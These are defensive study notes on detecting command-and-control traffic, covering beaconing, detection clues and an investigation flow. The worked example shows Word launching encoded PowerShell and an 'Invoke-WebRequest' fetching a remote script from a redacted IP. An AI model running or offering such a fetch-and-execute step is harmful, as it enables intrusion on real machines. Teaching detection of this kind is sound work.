# Command & Control (C2)

## 📌 What is C2?

**Command & Control (C2)** is the communication between a **compromised machine** and an **attacker-controlled system**.

It allows an attacker to:

* Send commands
* Receive information
* Control the compromised machine

```text
Attacker
   ↓
C2 Server
   ↓
Compromised Machine
```

---

## 🔗 Common C2 Methods

| Method         | Description                                      |
| -------------- | ------------------------------------------------ |
| **HTTP/HTTPS** | Malware communicates through web traffic         |
| **DNS**        | Malware abuses DNS requests for communication    |
| **TCP**        | Malware communicates through network connections |
| **Proxy**      | A middle system is used between victim and C2    |

> HTTPS does **not** automatically mean safe. Malware can also use HTTPS.

---

## 📡 Beaconing

**Beaconing** = a compromised machine repeatedly contacts a C2 server at regular or semi-regular intervals.

```text
10:00 → C2
10:05 → C2
10:10 → C2
10:15 → C2
```

Repeated communication can be a **C2 clue**, but it is not proof by itself.

---

## 🚨 C2 Detection Clues

A SOC analyst should investigate:

* Unusual external connections
* Repeated connections at regular intervals
* Strange/random DNS requests
* Unknown or suspicious domains/IPs
* PowerShell or other unusual processes making network connections
* Suspicious parent → child process chains
* Network activity after a suspicious file was opened
* Persistence appearing before network activity

---

## 🔍 SOC Investigation Flow

```text
Suspicious File
      ↓
Process
      ↓
Parent Process
      ↓
Command / Script
      ↓
IP / Domain
      ↓
Network Pattern
      ↓
Persistence
      ↓
Possible C2
```

### Questions to ask

**WHO?**
Which process made the connection?

**WHERE?**
Which IP/domain was contacted?

**HOW?**
HTTP, HTTPS, DNS, TCP?

**WHEN?**
How often does it communicate?

**WHY?**
Why is this process communicating with that destination?

**WHAT ELSE?**
Is there persistence or other suspicious activity?

---

## 🧪 Example

```text
WINWORD.EXE
     ↓
POWERSHELL.EXE
     ↓
powershell.exe -enc [encoded command]
     ↓
Invoke-WebRequest https://185.XX.XX.24/update.ps1
     ↓
185.XX.XX.24:443
     ↓
Connection every ~5 minutes
     ↓
Scheduled Task created
```

### Analysis

* **WINWORD → PowerShell** = suspicious process chain
* **`-enc`** = Base64-encoded PowerShell command
* **Invoke-WebRequest** = downloads/retrieves a file
* **External IP** = network indicator to investigate
* **Every ~5 minutes** = possible beaconing
* **Scheduled Task** = persistence clue

Together, these behaviors provide a **stronger C2 investigation lead** than any single indicator alone.

---

## 🧠 Key Difference

```text
Persistence = "I want to stay."

C2 = "I want to communicate."

Execution = "I want to run something."

Exfiltration = "I want to steal/send data."
```

## ⭐ Remember

> **C2 detection is about behavior and context, not just a suspicious IP.**
